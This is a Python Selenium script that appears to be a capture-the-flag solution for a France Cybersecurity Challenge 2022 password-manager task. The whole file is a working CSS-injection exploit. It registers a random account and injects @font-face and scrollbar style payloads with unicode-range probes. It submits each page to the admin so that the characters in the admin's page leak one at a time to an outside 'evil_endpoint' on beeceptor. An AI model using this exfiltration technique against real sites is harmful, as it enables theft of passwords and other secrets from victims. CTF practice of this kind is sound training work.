#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import string
import time
import random
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions

evil_endpoint = "https://fcsc2022.free.beeceptor.com/"

# Uppercase + lowercase + digits
chars = string.ascii_letters + string.digits 

print(f"[\x1b[92m+\x1b[0m] Starting exploit")

# Generating random username 
username = "".join([random.choice(chars) for k in range(10)])
password = "P4sswordpass"

# Creating driver
options = FirefoxOptions()
options.add_argument("--headless")
driver = webdriver.Firefox(options=options)

# Login with credentials
driver.get("https://cloud-password-manager.france-cybersecurity-challenge.fr/login")
driver.find_element_by_name("username").send_keys(username)
driver.find_element_by_name("password").send_keys(password)
driver.find_element_by_tag_name("form").submit()

print(f"[\x1b[92m+\x1b[0m] Logged in with credentials: {username}:{password}")

# Payload template
template = """
@font-face{
    font-family:toto;
    src:url(/static/fonts/Georgia.ttf);
    size-adjust:1000%%; /* %% because of format string */
    unicode-range:unicoded_char;
}
#p1{
    overflow:auto;
    width:150px;
    height:60px;
    font-family: toto;
}
#p1::-webkit-scrollbar{
    background-image: url(%s?character_returned);
}
""" % evil_endpoint

for char in chars:
    print(f"[\x1b[94m>\x1b[0m] Sending payload for '{char}'")

    # Encoding character 
    unicoded = f"U+00{char.encode().hex()}"

    # Replacing template values to put our characters
    res = template.replace("character_returned", char).replace("unicoded_char", unicoded)
    
    time.sleep(2)

    # Clicking on button to update style
    driver.find_elements_by_tag_name("button")[-1].click()

    # Filling the textarea with our css
    style_content = driver.find_element_by_name("style_content")
    style_content.clear()
    style_content.send_keys(res)

    # Update our style
    driver.find_elements_by_tag_name("form")[1].submit()

    time.sleep(1)
    
    # Send to the admin
    driver.find_elements_by_tag_name("form")[-1].submit()

    time.sleep(5)

# Closing driver
driver.close()

print(f"[\x1b[92m+\x1b[0m] Exploit finished, check your evil endpoint {evil_endpoint}")